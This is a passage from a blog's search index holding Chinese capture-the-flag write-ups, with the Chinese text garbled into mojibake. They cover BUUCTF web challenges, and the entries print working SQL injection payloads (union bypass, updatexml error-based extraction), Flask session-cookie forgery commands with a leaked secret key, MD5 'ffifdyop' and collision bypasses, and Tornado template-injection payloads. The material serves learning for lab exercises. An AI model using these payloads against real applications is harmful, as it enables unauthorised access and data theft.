åº”è¯¥æ˜¯md5æ¨¡å¼çš„.åŒæ—¶ç™»å…¥æ—¶è¾“å…¥å¯¹åº”çš„æ˜æ–‡å¯†ç å³å¯ã€‚\n\n æ„é€ ï¼š`name=123'union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b'#&pw=1`\n\nå…¶ä¸­ md5å€¼ä¸º1çš„md5å€¼ï¼Œè¿™é‡Œå°±æ˜¯æ„é€ äº† å½“åå°æ£€æµ‹`1 = mdï¼ˆ1ï¼‰`æ—¶ä¸ºçœŸ æˆåŠŸç™»å½•\n\nå…¶å®å°±æ˜¯ åå°å»æŸ¥æ‰¾ç¬¦åˆå¯†ç ä¸º1çš„md5å€¼  ä½†æ˜¯æœ¬æ¥æ²¡æœ‰ æˆ‘ä»¬åˆ©ç”¨è”åˆæŸ¥è¯¢ç‰¹æ€§æ„é€ äº†ä¸€ä¸ªæ— ä¸­ç”Ÿæœ‰ äºæ˜¯èƒ½æˆåŠŸç™»å½•\n","tags":["sqlæ³¨å…¥","è”åˆæŸ¥è¯¢ç‰¹æ€§","base32"],"categories":["buuctf"]},{"title":"buuctf 25-[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL","url":"/post/58b11103.html","content":"\nbuuctf [æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQ\n\n<!--more-->\n\nè¿™ä¸ªé¢˜ç›®æ˜¯æŠ¥é”™æ³¨å…¥çš„å…¸å‹ï¼Œå€¼å¾—è®°å½•ä¸€ä¸‹\n\nç®€å•å°è¯•ä¹‹åå¸¸è§çš„å­—ç¬¦æ¯”å¦‚ç©ºæ ¼ unionéƒ½è¢«é»‘åå•äº† å°è¯•ç”¨/**/ç»•è¿‡ç©ºæ ¼ä½†è¿˜æ˜¯ä¸è¡Œï¼Œåªèƒ½ç”¨ï¼ˆï¼‰æ¥ç»•è¿‡ç©ºæ ¼\n\nè¿™é‡Œæµ‹è¯•ç©ºæ ¼æ˜¯å¦è¢«æ²³èŸ¹ ä¸èƒ½é€šè¿‡1'åŠ ç©ºæ ¼ è¿™æ ·æµ‹è¯•æ˜¯ä¸å¯¹çš„\n\næœ€å¥½æ˜¯ç”¨`1' #`è¿™æ ·æµ‹è¯•æ¯”è¾ƒæ­£ç¡®ï¼Œå› ä¸ºä¸€èˆ¬é¢˜ç›®ä¸ä¼šæ²³èŸ¹#å­—ç¬¦\n\nç©ºæ ¼ç»•è¿‡çš„åŸç†ï¼š æ‹¬å·æ˜¯æ¥åŒ…å«å­æŸ¥è¯¢çš„ï¼Œä»»ä½•å¯ä»¥è®¡ç®—å‡ºç»“æœçš„è¯­å¥éƒ½å¯ä»¥ç”¨æ‹¬å·å›´èµ·æ¥ï¼Œè€Œæ‹¬å·çš„ä¸¤ç«¯ï¼Œå¯ä»¥æ²¡æœ‰å¤šä½™çš„ç©ºæ ¼  \n\nso æ‰€ä»¥åªèƒ½ç”¨æŠ¥é”™æ³¨å…¥äº†ï¼Œè¿™é‡Œå°±å¥½å¥½å›é¡¾ä¸€ä¸‹æŠ¥é”™æ³¨å…¥\n\nä¸€èˆ¬æŠ¥é”™æ³¨å…¥åˆ†ä¸ºä¸¤ä¸ªå‡½æ•°ï¼šupdatexml() ä¸extractvalue()\n\nå°±æ‹¿updatexmlä¸¾ä¾‹ ä»–ä»¬ä¸¤çš„å·®åˆ«å°±åªæ˜¯ä¼ å‚ä¸Š\n\n`updatexml(1ï¼Œ2ï¼Œ3)`å‡½æ•°æ€»å…±æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œå½“ç¬¬äºŒä¸ªå‚æ•°æœ‰ç‰¹æ®Šç¬¦å·æ—¶ï¼Œå°±ä¼šè§¦å‘æ•°æ®åº“æŠ¥é”™ï¼Œè€Œä¸”å°†å‚æ•°2çš„å†…å®¹æ˜¾ç¤ºåœ¨æŠ¥é”™ä¿¡æ¯ä¸­ï¼Œå¸¸ç”¨æ˜¯`~`ä»–çš„åå…­è¿›åˆ¶ç”¨`0x7e`è¡¨ç¤º\n\nç„¶åï¼ŒæŠ¥é”™æ³¨å…¥å¸¸ç”¨æ‹¼æ¥å‡½æ•° concatå’Œgroup_concat\n\n`concat`å’Œ`group_concat`éƒ½æ˜¯ç”¨åœ¨sqlè¯­å¥ä¸­åšæ‹¼æ¥ä½¿ç”¨çš„ï¼Œä½†æ˜¯ä¸¤è€…ä½¿ç”¨çš„æ–¹å¼ä¸å°½ç›¸åŒï¼Œ`concat`æ˜¯é’ˆå¯¹ä»¥è¡Œæ•°æ®åšçš„æ‹¼æ¥ï¼Œè€Œ`group_concat`æ˜¯é’ˆå¯¹åˆ—åšçš„æ•°æ®æ‹¼æ¥ï¼Œä¸”`group_concat`è‡ªåŠ¨ç”Ÿæˆé€—å·ã€‚\n\næ‰€ä»¥æ ¼å¼ä¸€èˆ¬ä¸ºï¼š`updatexml(1,concat(0x7e,sqlè¯­å¥,0x7e),1)`\n\nç„¶è€Œï¼Œ`extractvalue(1ï¼Œ2`)åªæœ‰ä¸¤ä¸ªå‚æ•°ï¼Œå½“ç¬¬äºŒä¸ªå‚æ•°å…·æœ‰ç‰¹æ®Šç¬¦å·æ—¶ï¼Œåˆ™ä¼šæŠ¥é”™ã€‚\n\næ ¼å¼ä¸ºï¼š`extractvalue( 1,concat(0x7e,sqlè¯­å¥))`\n\nå›åˆ°é¢˜ç›®ï¼š\n\nå…¶å®é¢˜ç›®æœ¬èº«å°±æ˜¯è€ƒå¯ŸæŠ¥é”™æ³¨å…¥ä¸ç»•è¿‡ç©ºæ ¼ è¿™é‡Œå°±ç®€å•è°¢è°¢payloadï¼š\n\n```\n1'or(updatexml(1,concat(0x7e,database(),0x7e),1))#\n```\n\nXPATH syntax error: '~geek~'\n\n```\n1'or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like('geek')),0x7e),1))#\n```\n\nXPATH syntax error: '~H4rDsq1~'\n\n```\n1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))#\n```\n\nXPATH syntax error: '~id,username,password~'\n\n```\n1'or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))#\n```\n\nXPATH syntax error: '~1flagflag{9804c176-72e3-46d2-90'\n\nè¿™é‡Œflagæ˜¾ç¤ºçš„ä¸å®Œå…¨ï¼Œç”¨åˆ°left å’Œ rightå‡½æ•°\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346493.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346308.png)\n\n```\n1'or(updatexml(1,concat(0x7e,(select(right(password,35))from(H4rDsq1)),0x7e),1))#\n```\n\nXPATH syntax error: '~04c176-72e3-46d2-902b-0e79f4ea1'\n\næŸ¥è¯¢åˆ°å…¶ä½™çš„flag\n\nå› ä¸ºè¿˜æ²³èŸ¹äº†= æ‰€ä»¥ç”¨äº†likeè¯­å¥\n\nå®Œæˆï¼\n","tags":["sqlæ³¨å…¥","æŠ¥é”™æ³¨å…¥","ç©ºæ ¼ç»•è¿‡"],"categories":["buuctf"]},{"title":"buuctf 22-admin","url":"/post/b64980cf.html","content":"\nbuuctf  admin\n\n<!--more-->\n\nè¿™åˆ°é¢˜ç›®æœ‰ä¸€ä¸ªéé¢„æœŸï¼Œå¼±å£ä»¤ç›´æ¥çˆ†å‡ºæ¥äº†ï¼Œç›´æ¥è´¦å·ä¸ºadminï¼Œå¯†ç ä¸º123å°±èƒ½æ‹¿åˆ°flagï¼Œæˆ‘è¿˜æƒ³è¿™é¢˜æ€ä¹ˆè¿™ä¹ˆç®€å•ï¼Œçœ‹äº†åˆ«äººçš„é¢˜è§£æ‰å‘ç°åˆæ˜¯ä¸€é“å­¦ä¹ çš„é¢˜ç›®ã€‚\n\né¢„æœŸè§£ï¼š\n\nå…ˆç”³è¯·ä¸€ä¸ªè´¦å·ï¼ŒæŠ“åŒ…çœ‹åˆ°ï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346193.png)\n\né‚£ä¹ˆè¿™é“é¢˜çš„æ€è·¯å°±æ˜¯è®©æˆ‘å»ç™»å½•ç®¡ç†å‘˜çš„è´¦å·å°±èƒ½æ‹¿åˆ°flagäº†ï¼Œä½†æ˜¯ä¸çŸ¥é“å¯†ç \n\nå­¦ä¹ åˆ«äººçš„wpï¼š\n\nåœ¨æºç ä¸­å‘ç°ä¸€ä¸ªgithubé“¾æ¥ï¼š<!-- https://github.com/woadsl1234/hctf_flask/ -->\n\næ‰“å¼€æ˜¯ä¸€ä¸ªflaské¡¹ç›®ï¼ŒFlaskæ˜¯ä¸€ä¸ªç”¨Pythonç¼–å†™çš„Webåº”ç”¨ç¨‹åºæ¡†æ¶\n\næ¯”è¾ƒé‡è¦çš„æ–‡ä»¶å°±æ˜¯ï¼š\n\nuser.sqlè¿™æ˜¯ä¸€ä¸ªå»ºæ•°æ®åº“çš„æ–‡ä»¶\n\nrun.py å°±æ˜¯å¯åŠ¨è¿™ä¸ªç¨‹åº æŠŠç«¯å£å¼€æ”¾åœ¨äº’è”ç½‘ä¸­\n\nappæ–‡ä»¶ä¸­ routes.py å¯¹åº”è·¯ç”± éå¸¸é‡è¦ flaskä¸­å°±æ˜¯ä¸€ä¸ªä¸€ä¸ªè·¯ç”±ç»„æˆçš„\n\næŸ¥çœ‹æºç ï¼š\n\n```php\n#!/usr/bin/env python\n# -*- coding:utf-8 -*-\n\n\nfrom flask import Flask, render_template, url_for, flash, request, redirect, session, make_response\nfrom flask_login import logout_user, LoginManager, current_user, login_user\nfrom app import app, db\nfrom config import Config\nfrom app.models import User\nfrom forms import RegisterForm, LoginForm, NewpasswordForm\nfrom twisted.words.protocols.jabber.xmpp_stringprep import nodeprep\nfrom io import BytesIO\nfrom code import get_verify_code\n\n\n@app.route('/code')\ndef get_code():\n    image, code = get_verify_code()\n    # å›¾ç‰‡ä»¥äºŒè¿›åˆ¶å½¢å¼å†™å…¥\n    buf = BytesIO()\n    image.save(buf, 'jpeg')\n    buf_str = buf.getvalue()\n    # æŠŠbuf_strä½œä¸ºresponseè¿”å›å‰ç«¯ï¼Œå¹¶è®¾ç½®é¦–éƒ¨å­—æ®µ\n    response = make_response(buf_str)\n    response.headers['Content-Type'] = 'image/gif'\n    # å°†éªŒè¯ç å­—ç¬¦ä¸²å‚¨å­˜åœ¨sessionä¸­\n    session['image'] = code\n    return response\n\n\n@app.route('/')\n@app.route('/index')\ndef index():\n    return render_template('index.html', title = 'hctf')\n\n\n@app.route('/register', methods = ['GET', 'POST'])\ndef register():\n\n\n    if current_user.is_authenticated:\n        return redirect(url_for('index'))\n\n\n    form = RegisterForm()\n    if request.method == 'POST':\n        name = strlower(form.username.data)\n        if session.get('image').lower() != form.verify_code.data.lower():\n            flash('Wrong verify code.')\n            return render_template('register.html', title = 'register', form=form)\n        if User.query.filter_by(username = name).first():\n            flash('The username has been registered')\n            return redirect(url_for('register'))\n        user = User(username=name)\n        user.set_password(form.password.data)\n        db.session.add(user)\n        db.session.commit()\n        flash('register successful')\n        return redirect(url_for('login'))\n    return render_template('register.html', title = 'register', form = form)\n\n\n@app.route('/login', methods = ['GET', 'POST'])\ndef login():\n    if current_user.is_authenticated:\n        return redirect(url_for('index'))\n\n\n    form = LoginForm()\n    if request.method == 'POST':\n        name = strlower(form.username.data)\n        session['name'] = name\n        user = User.query.filter_by(username=name).first()\n        if user is None or not user.check_password(form.password.data):\n            flash('Invalid username or password')\n            return redirect(url_for('login'))\n        login_user(user, remember=form.remember_me.data)\n        return redirect(url_for('index'))\n    return render_template('login.html', title = 'login', form = form)\n\n\n@app.route('/logout')\ndef logout():\n    logout_user()\n    return redirect('/index')\n\n\n@app.route('/change', methods = ['GET', 'POST'])\ndef change():\n    if not current_user.is_authenticated:\n        return redirect(url_for('login'))\n    form = NewpasswordForm()\n    if request.method == 'POST':\n        name = strlower(session['name'])\n        user = User.query.filter_by(username=name).first()\n        user.set_password(form.newpassword.data)\n        db.session.commit()\n        flash('change successful')\n        return redirect(url_for('index'))\n    return render_template('change.html', title = 'change', form = form)\n\n\n@app.route('/edit', methods = ['GET', 'POST'])\ndef edit():\n    if request.method == 'POST':\n        \n        flash('post successful')\n        return redirect(url_for('index'))\n    return render_template('edit.html', title = 'edit')\n\n\n@app.errorhandler(404)\ndef page_not_found(error):\n    title = unicode(error)\n    message = error.description\n    return render_template('errors.html', title=title, message=message)\n\n\ndef strlower(username):\n    username = nodeprep.prepare(username)\n    return username\n```\n\n## é¢„æœŸè§£ä¸€ï¼š\n\nunicodeç‰¹æ®Šå­—ç¬¦ç»•è¿‡\n\nä»£ç å®¡è®¡ çœ‹åˆ°ä¸Šé¢æ³¨å†Œï¼Œç™»å½•ï¼Œä¿®æ”¹ç³»ç»Ÿå‡æœ‰ä¸€ä¸ªè½¬å°å†™çš„æ“ä½œstrlower(),å¹¶ä¸”è¿™ä¸ªè½¬å°å†™çš„å‡½æ•°ä¸æ˜¯pythonè‡ªå¸¦çš„ï¼Œæ˜¯è‡ªå·±å°è£…çš„ï¼Œé‚£ä¹ˆè¿™æ˜¯éå¸¸ä¸æ­£å¸¸çš„ã€‚\n\n```php\ndef strlower(username):\n    username = nodeprep.prepare(username)\n    return username\n```\n\nè¿™é‡Œé€šè¿‡è°ƒç”¨nodeprepæ¨¡å—ï¼Œnodeprep.prepareè¿™ä¸ªæ–¹æ³•æ˜¯å°†å¤§å†™å­—æ¯è½¬æ¢æˆå°å†™å­—æ¯ï¼Œä½†æ˜¯å®ƒå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼šå®ƒä¼šå°†unicodeç¼–ç çš„á´¬è½¬åŒ–æˆA\n\nåœ¨ä»£ç å¼€å¤´æœ‰ä¸€è¡Œä»£ç ï¼š`from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep`ï¼Œè¯´æ˜nodeprepæ˜¯ä»twistedæ¨¡å—ä¸­å¯¼å…¥çš„ï¼Œåˆ©ç”¨nodeprep.prepareå‡½æ•°ä¼šå°†unicodeå­—ç¬¦á´¬è½¬æ¢æˆAï¼Œè€ŒAåœ¨è°ƒç”¨ä¸€æ¬¡nodeprep.prepareå‡½æ•°ä¼šæŠŠAè½¬æ¢æˆaã€‚è€Œå€¼å¾—æ³¨æ„çš„æ˜¯strlower()è‡ªå®šä¹‰å‡½æ•°è¢«è°ƒç”¨äº†ä¸‰æ¬¡ï¼Œåˆ†åˆ«æ˜¯registerã€loginã€changeï¼Œå³æ³¨å†Œã€ç™»é™†ã€ä¿®æ”¹å¯†ç æ—¶éƒ½ä¼šè¢«è°ƒç”¨ã€‚\n\næ€è·¯ï¼šç”¨á´¬dminæ³¨å†Œï¼Œåå°ä»£ç å°±ä¼šè°ƒç”¨ä¸€æ¬¡nodeprep.prepareå‡½æ•°ï¼ŒæŠŠç”¨æˆ·åè½¬æ¢æˆAdminï¼›ä¿®æ”¹ä¸€æ¬¡å¯†ç ï¼Œå†æ¬¡è°ƒç”¨nodeprep.prepareå‡½æ•°ï¼Œä½¿ç”¨æˆ·åç”±Adminè½¬æ¢ä¸ºadminï¼Œé‡æ–°ç™»é™†ï¼Œå°±å¯ä»¥å¾—åˆ°flagã€‚\n\n## é¢„æœŸè§£äºŒï¼š\n\næŠ“åŒ…å‘ç°session\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346152.png)\n\nflask sessionä¼ªé€ \n\nå…ˆäº†è§£ä¸€ä¸‹sessionï¼šç®€å•è¯´å°±æ˜¯ä¿æŒä¼šè¯ç™»å½•ï¼Œè¯†åˆ«ç”¨æˆ·\n\nä½†æ˜¯ä¸€èˆ¬sessionæ˜¯å­˜å‚¨åœ¨æœåŠ¡å™¨çš„ï¼Œä½†æ˜¯flaskå­˜å‚¨åœ¨å®¢æˆ·ç«¯ï¼Œä»–æ˜¯å¯¹ç§°åŠ å¯†è§£å¯†ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œè§£ç ç„¶åä¼ªé€ ç¼–ç ä¸Šä¼ ã€‚\n\nåœ¨config.pyæ‹¿åˆ°å¯†é’¥`ckj123` å¾…ä¼šè¿›è¡ŒåŠ å¯†è§£å¯†çš„æ—¶å€™ç”¨\n\n```php\nimport os\n\n\nclass Config(object):\n    SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123'\n    SQLALCHEMY_DATABASE_URI = 'mysql+pymysql://root:adsl1234@db:3306/test'\n    SQLALCHEMY_TRACK_MODIFICATIONS = True\n```\n\nä»ç½‘ä¸Šä¸‹è½½ä¸€ä¸ªsession è§£å¯†åŠ å¯†çš„è„šæœ¬\n\næ„é€ payloadï¼š\n\n```\npython flask_session_cookie_manager3.py decode -c \".eJw9kMFuwjAMhl9l8plDm5YLEgemdB0Hu8qWEjmXCkopTQmTCohRxLsvYhIHS7Z_-f9s36HaDc1pD7PzcGkmUHVbmN3hbQMzKPKPrtBLgbqOUW4PaErB2jqbr5yVKmXPKcrVnn0WUW571iys6688coRSCZRZZE0WZjkmjVdyeGNdJoXkaYgUfRnqVlCu0sKwIPkeGFmChnrUiyhwPAl1Q8eJdXVa6D4msRzRqF8y9hB6IbcdjWoOjwnUp2FXnX_65vg6wfqvA_rlSIavNlcjujJgbMeunQbEaCX5sF5q8-xGrkxYZFNazJ92nV-3zcvp28efZfuvHNc-CLDe1DCBy6kZnl-DOILHHzuQaZg.Y-IrhQ.zQZe9rQP9NoUHeJmwwmmUuZ6x-Q\" -s \"ckj123\"\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346053.png)\n\nå¾—åˆ°ï¼š\n\n```\n{'_fresh': True, '_id': b'8ab92617507e1e6a6cdecd48bf805aba44fda66f90c64046014ea5065530632a578698682e2a864d89f640e1a71cd104def7d2267f789957b31d15fef731fb74', 'csrf_token': b'fde2b35f0dd325646bb89103d3f068da2657ca94', 'image': b'JmGR', 'name': 'abc', 'user_id': '10'}\n```\n\nå°†æˆ‘ä»¬åˆ›å»ºçš„abcæ”¹ä¸ºadmin ç„¶åå†åŠ å¯† bpæŠ“åŒ…ä¿®æ”¹\n\næ„é€ payloadï¼š\n\n```\npython flask_session_cookie_manager3.py encode -t \"{'_fresh': True, '_id': b'8ab92617507e1e6a6cdecd48bf805aba44fda66f90c64046014ea5065530632a578698682e2a864d89f640e1a71cd104def7d2267f789957b31d15fef731fb74', 'csrf_token': b'fde2b35f0dd325646bb89103d3f068da2657ca94', 'image': b'JmGR', 'name': 'admin', 'user_id': '10'}\" -s \"ckj123\"\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346142.png)\n\nå¾—åˆ°ï¼š\n\n```\n.eJw9kLFuwkAMhl-l8syQXMKCxEB1IWWwo2svRPaCKISQC0elAKIE8e49UYnBku1f_j_bd1jt-vq0h8m5v9QjWLVbmNzh7RsmUOTztrALhXYTo94esCoVW3GSL51ok7LnFPVyzz6LKJeOLStx3ZUHjlAbhTqLpMrCLMdk8UoOb2zLpNA8DpGiL0PdKMpNWlSsSL8HRpZgRR3aWRQ4npS5oeNE3CYtbBeTWgxYmV-q5BB6IZeWBjOFxwg2p363Ov909fF1gvjPA_rFQBVfJTcDujJgpGXXjANiEE0-rJdKnt3IlQmrbEyz6dOu9eumfjl9-fijbP6V49oHAdZb3x5hBJdT3T__BnEEjz8Vlmp7.Y-IsQQ.ZB68OAuy6kj1z0CD9iH_lurm7zY\n```\n\næ›´æ¢sessionï¼ŒæˆåŠŸ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346032.png)\n","tags":["flaskæ¡†æ¶","å¼±å£ä»¤","sessionä¼ªé€ ","unicodeç‰¹æ®Šå­—ç¬¦"],"categories":["buuctf"]},{"title":"buuctf 21-[BJDCTF2020]Easy MD5","url":"/post/eef45ee2.html","content":"\nbuuctf [BJDCTF2020]Easy MD5\n\n<!--more-->\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082347242.png)\n\næ€è·¯ï¼šçœ‹åˆ°urlä¸Šåˆpasswordå­—æ ·ï¼Œåˆæœ‰è¾“å…¥æ ï¼Œéšä¾¿ä¼ å…¥adminç„¶åæŠ“åŒ…è¯•è¯•ï¼Œå‘ç°æç¤ºã€‚\n\n![img](https://cdn.nlark.com/yuque/0/2023/png/34855848/1672999105035-1d740daa-ecd7-4e10-b27c-295c05f5b80c.png)\n\næ˜¾ç¤º`select * from 'admin' where password=md5($pass,true)`\n\n**åˆ†æï¼šé€šè¿‡sqlè¯­å¥ï¼Œä»adminè¡¨é‡ŒæŸ¥æ•°æ®ï¼Œå½“password=mdï¼ˆï¼‰å‡½æ•°åŠ å¯†åçš„passæ—¶å°±å¯æŸ¥è¯¢ã€‚**\n\n**è€ƒç‚¹ï¼š**\n\n1. **sqlè¯­å¥æ³¨å…¥**\n2. **md5ï¼ˆï¼‰å‡½æ•°ï¼šæœ¬æ¥åº”è¯¥è¿”å›32 ä½çš„åå…­è¿›åˆ¶æ•°å½¢å¼æ•£åˆ—å€¼ï¼Œä½†æ˜¯æ­¤é¢˜å¯é€‰çš„ binary è¢«è®¾ç½®ä¸º trueï¼Œé‚£ä¹ˆ md5 æ‘˜è¦å°†ä»¥ 16 ä½çš„åŸå§‹äºŒè¿›åˆ¶æ ¼å¼è¿”å›ã€‚**\n\nçœ‹åˆ°ä½œä¸šæç¤ºmd5åœ¨sqlæ³¨å…¥ä¸­å¸¸è§çš„æ­æ¡£æ˜¯å­—ç¬¦ä¸²ffifdyopï¼Œç„¶åå»è°·æ­Œï¼Œcsdnçœ‹çœ‹è¿™æ˜¯ä»€ä¹ˆä¸œè¥¿ã€‚\n\n**ffifdyop**\n\nç»è¿‡[md5](https://so.csdn.net/so/search?q=md5&spm=1001.2101.3001.7020)åŠ å¯†åï¼š276f722736c95d99e921722cf9ed621c\n\nå†è½¬æ¢ä¸º[å­—ç¬¦ä¸²](https://so.csdn.net/so/search?q=å­—ç¬¦ä¸²&spm=1001.2101.3001.7020)ï¼š'or'6<ä¹±ç >  å³  'or'66ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b\n\n**åŸç†ï¼šmd5ï¼ˆï¼‰å‡½æ•°å…ˆæŠŠ** `**ffifdyop**`**åŠ å¯†ä¸º**`**276f722736c95d99e921722cf9ed621c**`**Mysql åˆä¼šæŠŠ hex ï¼ˆåå…­è¿›åˆ¶ï¼‰è½¬æˆ ascii è§£é‡Š** \n\n åœ¨orçš„ä¸¤è¾¹è¦æœ‰å•å¼•å·ï¼Œä½¿å®ƒå˜æˆ password=â€˜xxxâ€™orâ€˜xxxâ€™ çš„å½¢å¼  \n\n å› æ­¤æ‹¼æ¥ä¹‹åçš„å½¢å¼æ˜¯select * from â€˜adminâ€™ where password=â€™â€™ or â€˜6xxxxxâ€™  ä¸ºä¸€ä¸ªæ°¸çœŸå¼\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082347249.png)\n\n\n\nè¾“å…¥å¾—åˆ°ä»£ç ï¼š\n\n```php\n$a = $GET['a'];\n$b = $_GET['b'];\n\n\nif($a != $b && md5($a) == md5($b)){\n    // wow, glzjin wants a girl friend.\n```\n\n**åˆ†æï¼šé€šè¿‡getä¼ å‚aï¼Œbï¼Œä½¿å¾—é¢˜ç›®md5å€¼å¼±ç›¸ç­‰ ã€‚**\n\n**æ–¹æ³•ï¼š**\n\n1. **æ•°ç»„ç»•è¿‡**\n2. **md5ï¼ˆï¼‰å€¼ç¢°æ’ï¼Œæœ‰ä¸€äº›ç‰¹æ®Šçš„æ•°å€¼åœ¨md5ï¼ˆï¼‰åŠ å¯†åä¼šå½¢æˆ0eå¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œä»è€Œè¾¾åˆ°å¼±ç›¸ç­‰**\n\n**md5ï¼ˆï¼‰ç¢°æ’åŸç†ï¼š**\n\n```php\n<?php\n$a=md5('QNKCDZO');\n$b=md5('s878926199a');\necho $a;\necho \"\\n\";\necho $b;\necho \"\\n\";\nif($a==$b)\n{\n    echo \"ä»–ä»¬å¼±ç›¸ç­‰\";\n}\n?>\nè¾“å‡ºï¼š\n0e830400451993494058024219903391\n0e545993274517709034328855841020\nä»–ä»¬å¼±ç›¸ç­‰\n```\n\né€‰æ‹©ä»»ä½•æ–¹æ³•éƒ½è¡Œï¼Œä¹‹åå¾—åˆ°ï¼š\n\n```php\n<?php\nerror_reporting(0);\ninclude \"flag.php\";\n\n\nhighlight_file(__FILE__);\n\n\nif($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){\n    echo $flag;\n}\n```\n\nåŒç†ï¼Œä¸è¿‡ä¹‹åæ˜¯å¼ºç±»å‹ç›¸ç­‰ï¼Œä¼°è®¡è¿™ä¸€å…³æ˜¯è€ƒå¯Ÿæ•°ç»„ç»•è¿‡å§ï¼Œä¹‹åå¾—åˆ°flag\n\n\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082347369.png)\n","tags":["md5ç»•è¿‡","ffifdyopç‰¹æ®Šå­—ç¬¦ä¸²"],"categories":["buuctf"]},{"title":"buuctf 20-[æŠ¤ç½‘æ¯ 2018]easy_tornado","url":"/post/98e6259a.html","content":"\nbuuctf 20-[æŠ¤ç½‘æ¯ 2018]easy_tornado\n\n<!--more-->\n\nè¿™æ˜¯ä¸€é“æ¯«æ— å¤´ç»ªçš„é¢˜ç›®ï¼Œå°±å½“ä½œå­¦ä¹ äº†ã€‚\n\nè¿›å…¥ä¹‹åæœ‰ä¸‰ä¸ªé¡µé¢å†…å®¹åˆ†åˆ«ä¸ºï¼š\n\nflag in /fllllllllllllag\n\nrender\n\nmd5(cookie_secret+md5(filename))\n\nå‘ç°è¯·æ±‚è¿‡ç¨‹å¾ˆå¥‡æ€ª\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349588.png)\n\né€šè¿‡filenameè¯·æ±‚ä¸€ä¸ªæ–‡ä»¶ç„¶åfilehashè¯·æ±‚ä¸€ä¸ªå“ˆè¥¿å€¼ ä¹Ÿå°±æ˜¯åŠ å¯†äº†ä¸€ä¸‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349619.png)\n\nå¦‚æœä¸è¯·æ±‚å“ˆå¸Œå€¼è¯•ä¸€ä¸‹ ç›´æ¥æŠ¥é”™ï¼Œå¹¶ä¸”æ³¨æ„ï¼š`/error?msg=Error`ç›´æ¥æ¥çœ‹å¤§ä½¬çš„wp\n\nrenderæ˜¯pythonä¸­çš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸€ç§æ¨¡æ¿ï¼Œé€šè¿‡è°ƒç”¨çš„å‚æ•°ä¸åŒï¼Œç”Ÿæˆä¸åŒçš„ç½‘é¡µ ï¼Œå¦‚æœç”¨æˆ·å¯¹renderå†…å®¹å¯æ§ï¼Œä¸ä»…å¯ä»¥æ³¨å…¥XSSä»£ç ï¼Œè€Œä¸”è¿˜å¯ä»¥é€šè¿‡`{{}}`è¿›è¡Œä¼ é€’å˜é‡å’Œæ‰§è¡Œç®€å•çš„è¡¨è¾¾å¼ã€‚\n\nTornadoæ˜¯ä¸€ç§ Web æœåŠ¡å™¨è½¯ä»¶çš„å¼€æºç‰ˆæœ¬ã€‚Tornado å’Œç°åœ¨çš„ä¸»æµ Web æœåŠ¡å™¨æ¡†æ¶ï¼ˆåŒ…æ‹¬å¤§å¤šæ•° Python çš„æ¡†æ¶ï¼‰æœ‰ç€æ˜æ˜¾çš„åŒºåˆ«ï¼šå®ƒæ˜¯éé˜»å¡å¼æœåŠ¡å™¨ï¼Œè€Œä¸”é€Ÿåº¦ç›¸å½“å¿«\n\nåœ¨tornadoæ¨¡æ¿ä¸­ï¼Œå­˜åœ¨ä¸€äº›å¯ä»¥è®¿é—®çš„å¿«é€Ÿå¯¹è±¡,è¿™é‡Œç”¨åˆ°çš„æ˜¯`handler.settings`ï¼Œ`handler`æŒ‡å‘`RequestHandler`ï¼Œè€Œ`RequestHandler.settings`åˆæŒ‡å‘`self.application.settings`ï¼Œæ‰€ä»¥handler.settingså°±æŒ‡å‘`RequestHandler.application.settings`äº†ï¼Œè¿™é‡Œé¢å°±æ˜¯æˆ‘ä»¬çš„ä¸€äº›ç¯å¢ƒå˜é‡.\n\nç„¶åé€šè¿‡ç¯å¢ƒå˜é‡å»è·å–`cookie_secret`\n\næ„é€ payload ï¼š`/error?msg={{handler.settings}}`\n\nå¾—åˆ°ï¼š`{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '76a26309-3853-4c68-b91e-eee75246e722'}`\n\nå‘ç°äº†`cookie_secret `\n\nä¹‹åå°†`/fllllllllllllag`åŠ å¯†ä¸€ä¸‹å°†`cookie_secret` åŠ ä¸Š å†è¿›è¡Œä¸€æ¬¡md5åŠ å¯†å°±å¯ä»¥è·å¾—flagäº†\n\næ„é€ payloadï¼š`?filename=/fllllllllllllag&filehash=99d14d071426405f00eca73ec4a5eb64`\n\næˆåŠŸï¼\n","tags":["renderæ¸²æŸ“","python","ç¯å¢ƒå˜é‡"],"categories":["buuctf"]},{"title":"buuctf 18-[RoarCTF 2019]Easy Calc","url":"/post/318fd29a.html","content":"\nbuuctf 18-[RoarCTF 2019]Easy Calc\n\n<!--more-->\n\næŠ“åŒ…å‘ç°æäº¤æ–¹å¼ä¸ºï¼š\n\nç»™/cal.php 